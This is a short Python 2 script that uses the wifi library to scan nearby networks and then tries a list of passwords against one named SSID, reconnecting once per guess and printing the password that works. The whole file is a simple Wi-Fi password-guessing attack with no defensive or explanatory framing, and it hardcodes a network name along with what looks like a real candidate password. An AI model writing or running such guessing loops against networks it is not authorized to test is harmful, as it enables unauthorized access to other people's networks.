from wifi import Cell, Scheme
import subprocess

wifi_adapter = "wlan1"


def scan_wifi():
    cells = Cell.all(wifi_adapter)
    for cell in cells:
        print(cell.ssid)
        print(cell.signal)
        print(cell.frequency)


def connect_to_wifi(interface, name, cell, password):
    scheme = Scheme.for_cell(interface, name, cell, password)
    previous_scheme =  Scheme.find(interface, name)
    if previous_scheme is not None:
        previous_scheme.delete()

    print scheme
    if scheme.find(interface, cell) is None:
        scheme.save()

    try:
        scheme.activate()
    except subprocess.CalledProcessError, e:
        print "Error: ", e.output
        return False
    return True


def try_to_connect_loop(interface, name, wifi_ssid, password_list):
    cells = Cell.all(wifi_adapter)
    cell_to_connect = None
    for cell in cells:
        if cell.ssid == wifi_ssid:
            cell_to_connect = cell
            break
    if cell_to_connect is None:
        return

    for password in password_list:
        rc = connect_to_wifi(interface, name, cell_to_connect, password)
        if rc is True:
            print "Found password! It's: ", password
            return
        else:
            print "Password ", password, " is incorrect"



possible_passwords = ["ABCD", "Kacper39400"]
def main():
    scan_wifi()
    try_to_connect_loop("wlan1", "home", "PozdroTechno", possible_passwords)



main()
